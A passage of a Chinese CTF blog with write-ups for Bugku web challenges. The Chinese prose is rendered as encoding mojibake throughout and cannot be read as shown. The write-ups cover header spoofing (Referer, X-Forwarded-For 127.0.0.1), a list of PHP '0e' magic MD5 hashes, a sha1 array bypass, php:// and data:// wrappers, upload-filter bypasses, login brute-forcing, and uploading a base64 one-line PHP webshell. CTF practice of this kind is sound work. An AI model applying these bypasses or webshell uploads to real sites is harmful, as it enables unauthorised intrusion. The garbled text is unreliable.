<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key  		æ™®é€šå­—ç¬¦key</span><br><span class="line">. 			é™¤äº†æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»æ„å­—ç¬¦ï¼Œ.*åŒ¹é…0ä¸ªæˆ–å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">key  		æ™®é€šå­—ç¬¦key</span><br><span class="line">.&#123;4,7&#125;		4ä¸ªåˆ°7ä¸ªé™¤äº†æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»æ„å­—ç¬¦(åŒ…æ‹¬4ï¼Œä¸åŒ…æ‹¬7)</span><br><span class="line">key  		æ™®é€šå­—ç¬¦key</span><br><span class="line">:    		æ™®é€šå­—ç¬¦:</span><br><span class="line">\&#x2F;   		è¿™é‡Œçš„\ä¸ºè½¬ä¹‰å­—ç¬¦,ä¹Ÿå°±æ˜¯è¡¨ç¤º&#x2F;</span><br><span class="line">.			é™¤äº†æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»æ„å­—ç¬¦</span><br><span class="line">\&#x2F;   		è¿™é‡Œçš„\ä¸ºè½¬ä¹‰å­—ç¬¦,ä¹Ÿå°±æ˜¯è¡¨ç¤º&#x2F;</span><br><span class="line">.			é™¤äº†æ¢è¡Œç¬¦ä¹‹å¤–çš„ä»»æ„å­—ç¬¦ï¼Œ.*åŒ¹é…0ä¸ªæˆ–å¤šä¸ªæ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">key  		æ™®é€šå­—ç¬¦key</span><br><span class="line">[a-z]		åŒ¹é…aåˆ°zä¹‹é—´çš„å­—ç¬¦</span><br><span class="line">[:punct:]	è¡¨ç¤ºåŒ¹é… !&quot;#$%&amp;â€™()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;&#123;|&#125;~.ä¸­çš„ä»»æ„ä¸€ä¸ª</span><br><span class="line">i		    è¡¨ç¤ºå¿½ç•¥å¤§å°å†™</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘æ„é€ æˆï¼š<code>http://123.206.87.240:8002/web10?id=keykey....key:/./keya:</code></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%AD%97%E7%AC%A6%EF%BC%9F%E6%AD%A3%E5%88%99%EF%BC%9F/0KY3%28S%7BG868TM%299FQ%7D%24%24%25%28T.png" alt=""></p>
<p>æˆåŠŸæ‹¿åˆ°flagï¼</p>
</li>
<li>
<h2 id="å‰å¥³å‹-SKCTF"><a class="header-anchor" href="#å‰å¥³å‹-SKCTF">Â¶</a>å‰å¥³å‹(SKCTF)</h2>
<p>å¥½å§ï¼Œé¢˜ç›®åˆæ˜¯æŒ‚çš„ï¼Œgg</p>
</li>
<li>
<h2 id="login1-SKCTF"><a class="header-anchor" href="#login1-SKCTF">Â¶</a>login1(SKCTF)</h2>
<p>ä¸ä¼šå§ï¼Œé˜¿sirï¼Œåˆæ˜¯æŒ‚çš„é¢˜</p>
</li>
<li>
<h2 id="ä½ ä»å“ªé‡Œæ¥"><a class="header-anchor" href="#ä½ ä»å“ªé‡Œæ¥">Â¶</a>ä½ ä»å“ªé‡Œæ¥</h2>
<p>ç»ˆäºæ˜¯é“èƒ½è®¿é—®çš„é¢˜äº†ï¼Œä¸å®¹æ˜“ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/A8_%606DQ%7B0%40UT%60%243KCV%294LHX.png" alt=""></p>
<p>æç¤ºæˆ‘ä»¬è¦ä»è°·æ­Œè®¿é—®ï¼Œäºæ˜¯æŠ“ä¸ªåŒ…æ”¹åŒ…ï¼ŒåŠ refererå¤´</p>
<p>referer:<code>https://www.google.com</code></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/2U%7B0ZAM%24%5DIVCR%5D7XCG3~0%7DF.png" alt=""></p>
<p>å•Šè¿™ï¼Œflagå°±å‡ºæ¥äº†ï¼Ÿå¤ªç®€å•äº†ã€‚ã€‚ã€‚</p>
</li>
<li>
<h2 id="md5-collision-NUPT-CTF"><a class="header-anchor" href="#md5-collision-NUPT-CTF">Â¶</a>md5 collision(NUPT_CTF)</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œæç¤ºæˆ‘ä»¬è¾“å…¥a</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/~%60%405THX%7B429ORPTH6GR2MQ1.png" alt=""></p>
<p>è¯•è¯•getè¾“å…¥ï¼Ÿ</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/P617F2S%7DE5Q4XCQXYT9I%40%293.png" alt=""></p>
<p>åº”è¯¥å¯èƒ½æ˜¯è¦è¾“å…¥é¢˜ç›®æç¤ºçš„md5ï¼Œç„¶åè¿›è¡Œä¸€ä¸ªç»•è¿‡ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/md5%20collision%28NUPT_CTF%29/UN%60%7DE0VCT4%7DRUHMKX6H1UCJ.png" alt=""></p>
<p>flagçˆ†å‡ºæ¥äº†ã€‚çŒœæµ‹æºç åº”è¯¥æ˜¯ç”¨aä¼ è¿›æ¥çš„md5å€¼å’Œå®ƒæºç çš„å¦ä¸€ä¸ªmd5å€¼è¿›è¡Œæ¯”è¾ƒã€‚è¿™é‡Œå†è¯´æ˜ä¸€ä¸‹ï¼Œphpå¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨!=æˆ–è€…==è¿›è¡Œä¸€ä¸ªæ¯”è¾ƒï¼Œæ¯ä¸€ä¸ª&quot;0E&quot;å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½ä¼šè¢«è§£é‡Šæˆ0ã€‚å› æ­¤ä¸¤ä¸ª&quot;0E&quot;å¼€å¤´çš„å“ˆå¸Œå€¼ä¼šè¢«phpè®¤ä¸ºç›¸ç­‰ã€‚</p>
<p>è¿™é‡Œè®°å½•ä¸€ä¸‹ä¸€äº›ä½¿ç”¨0eå¼€å¤´çš„md5å’ŒåŸå€¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<h2 id="ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™"><a class="header-anchor" href="#ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™">Â¶</a>ç¨‹åºå‘˜æœ¬åœ°ç½‘ç«™</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œæç¤ºæˆ‘ä»¬ä»æœ¬åœ°è®¿é—®</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/H%7BV6G1KGD14%29HAGV8B7WCHL.png" alt=""></p>
<p>é‚£æˆ‘ä»¬å°±æŠ“åŒ…åŠ ä¸ªxffå¤´ï¼ŒX-Forwarded-For:127.0.0.1</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99/%5DJCHINA92U0KSN0A%7BW%244YW6.png" alt=""></p>
<p>flagå°±å‡ºæ¥äº†</p>
</li>
<li>
<h2 id="å„ç§ç»•è¿‡"><a class="header-anchor" href="#å„ç§ç»•è¿‡">Â¶</a>å„ç§ç»•è¿‡</h2>
<p>è¿™æ¬¡æ˜¯ç»™æˆ‘ä»¬ä»£ç ï¼Œé€šè¿‡ç»•è¿‡è¿›è¡Œè·å–flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/7R%5BB3%290OA%5B%7BSATZJ8L%7BTLAX.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$_GET[<span class="string">&#x27;id&#x27;</span>] = urldecode($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;uname&#x27;</span>] == $_POST[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">&#x27;uname&#x27;</span>]) === sha1($_POST[<span class="string">&#x27;passwd&#x27;</span>])&amp;($_GET[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>æ€»çš„çœ‹ä¸‹æ¥ï¼Œéœ€è¦æˆ‘ä»¬é€šè¿‡getæäº¤å‚æ•°idå’Œå‚æ•°unameï¼Œè¿˜æœ‰é€šè¿‡postæäº¤ä¸€ä¸ªpasswdå‚æ•°</p>
<p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­ï¼Œåˆ¤æ–­æ˜¯å¦æäº¤unameå’Œpasswd</p>
<p>ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œunameçš„å€¼å’Œpasswdçš„å€¼ä¸€æ ·å°±è¾“å‡ºæç¤ºï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œä¸¤ä¸ªå‚æ•°çš„å€¼ä¸èƒ½ä¸€æ ·</p>
<p>ç¬¬ä¸‰ä¸ªifåˆ¤æ–­ï¼Œsha1()å‡½æ•°æ˜¯ç”¨æ¥è®¡ç®—å­—ç¬¦ä¸²çš„SHA-1æ•£åˆ—ï¼Œè¿™é‡Œè¦æ±‚ç»è¿‡sha1å‡½æ•°å¤„ç†çš„ä¸¤ä¸ªå€¼ä¸€æ ·å¹¶ä¸”å‚æ•°idç­‰äºmarginï¼Œå³å¯è¾“å‡ºflag</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„æ¥è¿›è¡Œç»•è¿‡sha1å‡½æ•°ï¼Œå› ä¸ºsha1å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›falseã€‚ä¸¤ä¸ªfalseï¼Œæ¡ä»¶å°±æˆç«‹äº†ï¼Œå°±å¯ä»¥ç»•è¿‡ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¿™ä¹ˆæ„é€ ä¸€ä¸‹</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87/KGYCCZ52%25%28F%7DD%24R%24~XQX2G2.png" alt=""></p>
<p>flagå‡ºæ¥äº†ï¼Œå§¿åŠ¿ä½¿ç”¨å¯¹äº†ã€‚</p>
</li>
<li>
<h2 id="web8"><a class="header-anchor" href="#web8">Â¶</a>web8</h2>
<p>æ‰“å¼€ï¼Œé¦–å…ˆæ˜¯ä¸€æ³¢ä»£ç å®¡è®¡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/%24O9CMJNNH%248%28%7B0R90%28F_%40NO.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¾“å‡ºflagéœ€è¦æ»¡è¶³ä¸‹é¢å‡ ä¸ªæ¡ä»¶ï¼š</span><br><span class="line">1.getä¼ å€¼çš„acå‚æ•°ä¸ä¸ºç©º</span><br><span class="line">2.å‚æ•°fçš„å€¼ä»æ–‡ä»¶fnä¸­è·å–</span><br><span class="line">3.å‚æ•°acéœ€è¦æ»¡è¶³ç­‰äºå‚æ•°f</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpä¼ªåè®®è¿›è¡Œæ„é€ <br>
ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨php://inputåè®®</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/D%5DHZ9FHB%5BG8X~TW%5DP5X%60CIJ.png" alt=""></p>
<p>ç¬¬äºŒç§æ–¹æ³•ï¼Œä½¿ç”¨data://text/plainåè®®</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/K28D7J0%5D%24JR6S41%7BWB%29%5BPL8.png" alt=""></p>
<p>è¡¥å……ï¼š</p>
<p>å› ä¸ºä¸€ç›´å¯¹é¢˜ç›®çš„txtæç¤ºæ„Ÿåˆ°ç–‘æƒ‘ï¼Œæƒ³ç€å¯èƒ½file_get_contentsè¯»å–çš„æ–‡ä»¶æ˜¯å­˜åœ¨çš„ï¼Œåé¢ä¹±è¯•äº†ä¸€é€šindex.txtï¼Œfn.txt<br>
ac.txtâ€¦flag.txtï¼Œå‘ç°æ˜¯å­˜åœ¨ä¸€ä¸ªflag.txt</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/D%28BU2~CWBAOBQWP%60TVAE0AN.png" alt=""></p>
<p>ç„¶åå¯ä»¥æ„é€ å–å¾—flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web8/%7BYUA%25%7B9%7D6W7UY%24%29PU3TDGMP.png" alt=""></p>
</li>
<li>
<h2 id="ç»†å¿ƒ"><a class="header-anchor" href="#ç»†å¿ƒ">Â¶</a>ç»†å¿ƒ</h2>
<p>æ‰“å¼€æ˜¯ä¸€ä¸ª404é¡µé¢<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/OK6R%5BVSY%5B%7B0AL215GT2GR%245.png" alt=""><br>
å¿ƒå¤´ä¸€åŠ¨ï¼Œè«éåˆæ˜¯ä¸€é“æŒ‚æ‰çš„é¢˜ï¼Ÿï¼Ÿï¼<br>
ä½†å’Œä¹‹å‰æŒ‚çš„é¢˜æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œç”¨å¾¡å‰‘æ‰«ä¸€ä¸‹<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/9%60S0%5B9Z%24~~7CR%5D1EBN3PTTO.png" alt=""><br>
æ‰«å‡ºä¸€ä¸ªrobots.txtï¼Œè®¿é—®ä¸€æ³¢<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/TRVX_OR7BM_%5D30%28%29W%7BSF%5BDW.png" alt=""><br>
è¿˜æœ‰ä¸ªresusl.phpé¡µé¢ï¼Œæ‰“å¼€<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/MON_0I~~NX9G%60%25I%5B7%29%7D~LBA.png" alt=""><br>
æç¤ºæˆ‘ä»¬éœ€è¦ç®¡ç†å‘˜ï¼Œé¡µé¢è¿˜æœ‰ä¸ªgetä¼ å€¼ï¼Œé‚£æˆ‘ä»¬è¯•è¯•ä¼ å€¼x=admin<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%BB%86%E5%BF%83/HZ%7B%5B_AJ5_VG%7DZBSEA4%2921NK.png" alt=""><br>
flagå‡ºæ¥äº†ï¼</p>
</li>
<li>
<h2 id="æ±‚getshell"><a class="header-anchor" href="#æ±‚getshell">Â¶</a>æ±‚getshell</h2>
<p>æ‰“å¼€é¡µé¢æ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%B1%82getshell/YFQ0%40IG%40U%40S2_BJ0%7DD3TAH6.png" alt=""><br>
è¯•è¿‡äº†å¾ˆå¤šç§æ–¹æ³•ï¼Œåšæˆå›¾ç‰‡é©¬ä¸Šä¼ ï¼Œæ”¹åç¼€ï¼Œæ”¹content-typeç±»å‹éƒ½æ˜¯å¤±è´¥ï¼Œä¹Ÿè¯•äº†phpçš„ä¸€äº›ç»•è¿‡å§¿åŠ¿.php|.php5|.php4|.php3|.php2|.php1|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|.pHp1ç­‰ç­‰</p>
<p>åé¢æ‰¾äº†èµ„æ–™å‘ç°ä¸Šé¢è¿˜æœ‰ä¸ªcontent-typeå¤´ï¼Œmultipart/form-dataå¤§å†™èƒ½ç»•è¿‡wafçš„ä¸¥æ ¼æ£€æµ‹ï¼Œæ‰€ä»¥å»è¯•äº†ä¸€æ³¢<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E6%B1%82getshell/AD%28GHI7ZH1OLA%24%5DS_LC8880.png" alt=""></p>
<p>æ€»ç»“ï¼š</p>
<p>1.ç¬¬ä¸€ä¸ªcontent-typeå¤´å¤§å†™ç»•è¿‡wafæ£€æµ‹<br>
2.ä¸Šä¼ æ–‡ä»¶çš„åç¼€åæ”¹æˆphp5ç»•è¿‡åç¼€æ£€æµ‹<br>
3.ä¸Šä¼ çš„content-typeå¤´å¾—æ˜¯imageç±»å‹æ»¡è¶³å›¾ç‰‡çš„è¦æ±‚</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–°ç‰ˆbugkuå¹³å°Writeup~æŒç»­æ›´æ–°ä¸­</title>
    <url>/posts/49040/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">Â¶</a>å‰è¨€</h2>
<p>å‰æ®µæ—¥å­ï¼Œæ–°ç‰ˆbugkuå¹³å°æ”¹ç‰ˆä¸Šçº¿ï¼Œç„¶åæˆ‘å°±å…´å†²å†²çš„å»åˆ·äº†ä¸€æ³¢ğŸ˜‚<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%60%5DEGP1RJ%5D%7DAC%5D_%5D85OHB%257U.png" alt=""><br>
å¤§éƒ¨åˆ†é¢˜è¿˜æ˜¯ä¸Šçº¿çš„è€bugkuå¹³å°çš„é¢˜ï¼Œä½†ä¹Ÿåœ¨é€æ¸ä¸Šçº¿æ–°é¢˜ï¼Œæ‰€ä»¥å¼€äº†ä¸ªæ–‡ç« è®°å½•ä¸‹æ–°é¢˜çš„åšé¢˜è¿‡ç¨‹ï¼ˆä¼šæ…¢æ…¢æ›´æ–°ï¼‰ã€‚æœ‰å¤§éƒ¨åˆ†webçš„é¢˜æˆ‘åœ¨åšå®¢çš„å¦ä¸€ç¯‡æ–‡ç« å†™è¿‡ï¼Œè¿™é‡Œä¸é‡å¤å†™äº†ï¼Œåªè®°å½•ä¸€äº›æƒ³è®°å½•çš„é¢˜ã€‚<br>
æƒ³çœ‹çš„å¸ˆå‚…ç§»æ­¥åˆ°è¿™é‡Œ<code>https://www.wlhhlc.top/posts/55334/</code>å™¢ã€‚</p>
<h2 id="Web"><a class="header-anchor" href="#Web">Â¶</a>Web</h2>
<h3 id="xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"><a class="header-anchor" href="#xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº">Â¶</a>xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº</h3>
<p>é¢˜ç›®æç¤ºæ˜¯ï¼šæœ¬äººç°å®ç¢°åˆ°çš„é¢˜ç›®ï¼Œæ— æç¤ºå‹¿é—®ã€‚å¥½å®¶ä¼™ï¼Œè«éè¦æ¸—é€ä¸€æ³¢ï¼Ÿï¼Ÿ<br>
æ‰“å¼€æ˜¯ä¸€ä¸ªè´­ç‰©å¸‚åœºé¡µé¢<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/G28I_WP%25XFU%2905H%60NC600YM.png" alt=""><br>
æµè§ˆå®Œä¸€éï¼Œå‘ç°æœ‰æ³¨å†Œå’Œç™»å½•åŠŸèƒ½ã€‚<br>
åœ¨ç™»å½•å°è¯•ç”¨adminç™»å½•ï¼Œæç¤ºé™åˆ¶å¾—6ä½ä»¥ä¸Šã€‚å‡†å¤‡é‡‡å–çˆ†ç ´ï¼Œå› ä¸ºéªŒè¯ç æ˜¯åªæ˜¯å‰æ®µéªŒè¯ï¼Œçˆ†ç ´æ˜¯å¯è¡Œçš„(ä¸è¿‡å°±ç®—ä¸æ˜¯å‰æ®µéªŒè¯ï¼Œè®­ç»ƒä¸€æ³¢éªŒè¯ç è¯†åˆ«ä¹Ÿå¯ä»¥å“ˆå“ˆå“ˆ~)<br>
ä½†ç”¨æˆ·åå’Œå¯†ç åŒæ—¶çˆ†ç ´å·¥ä½œé‡æœ‰ç‚¹å¤§ï¼Œæ‰€ä»¥æˆ‘ä»¬å»æ³¨å†Œé¡µé¢å»å°è¯•çˆ†ç ´æ³¨å†Œï¼Œçœ‹çœ‹èƒ½å¦çˆ†ç ´å‡ºå·²ç»å­˜åœ¨çš„ç”¨æˆ·å<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/U6CVM4G8VJOZ%5D2CR9KW0LNW.png" alt=""><br>
burpsuiteå¯åŠ¨ï¼<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/5LVOQBO085X%25U9~Q6KR8%28QP.png" alt=""><br>
çˆ†ç ´å‡ºå­˜åœ¨ç”¨æˆ·å123456ï¼Œæ¥ç€å»ç™»å½•é¡µé¢è¿›è¡Œçˆ†ç ´ï¼Œæ‹¿åˆ°å¯†ç ä¸º123456<br>
èŠœæ¹–ï¼Œç™»å½•ï¼âœŒï¸<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QZX%29EN3X%40%7DDW~6FSXD_OU_5.png" alt=""><br>
å‘ç°å¤´åƒæ˜¯å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œç„¶åç†Ÿæ‚‰çš„ä¸€æ¢­å­æ‰“ä¸‹å»ï¼ˆå›¾ç‰‡é©¬ï¼ŒæŠ“åŒ…ï¼‰<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/T0RM~~4R%24AQSD2R6_814M0D.png" alt=""><br>
å‘ç°æˆ‘ä»¬ä¼ é€çš„æ•°æ®æ˜¯base64çš„æ•°æ®æµï¼Œæˆ‘ä»¬å»å†™ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åbase64ç¼–ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/XN97XRJKMI%28EO%25H%256YFLQ%7DC.png" alt=""><br>
æŠŠæ‹¦æˆªçš„å›¾ç‰‡æ•°æ®æ”¹æˆç»è¿‡base64ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬ï¼Œå¹¶ä¸”æŠŠå‰é¢çš„jpegæ”¹æˆphpï¼Œgogogoï¼<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/7%7BJU8%7B2U%40VT5DZ44%5BUMU%25UE.png" alt=""><br>
ä¸Šä¼ æˆåŠŸï¼Œèšå‰‘å¯åŠ¨ï¼<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QQ%E6%88%AA%E5%9B%BE20201230103931.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/79IMCM%5DG~E%60B5%29%5BERZWUL2B.png" alt=""><br>
flagæˆåŠŸæ‹¿åˆ°ï¼Œæ”¶å·¥ã€‚</p>
<h3 id="å†¬è‡³çº¢åŒ…"><a class="header-anchor" href="#å†¬è‡³çº¢åŒ…">Â¶</a>å†¬è‡³çº¢åŒ…</h3>
<p>è‡³ä»Šä»ä¸çŸ¥é“é‚£å¤©çš„çº¢åŒ…æœ‰å¤šå¤§<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1%5D%60_N%29%5DP4Q%28M%29%40D4I7B%5B153.png" alt=""><br>
æ‰“å¼€é¢˜ç›®ï¼Œä¸€æ®µphpä»£ç ï¼Œè€ƒç»•è¿‡çš„åŠŸåº•äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1NYXWXRZ8%7DG%5B57CFJ%28YMLN8.png" alt=""><br>
é¦–å…ˆå®¡è®¡ä¸€ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    $exam = <span class="string">&#x27;return\&#x27;&#x27;</span>.sha1(time()).<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.$exam.<span class="string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">&#x27;flag&#x27;</span>]) != strlen($exam)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 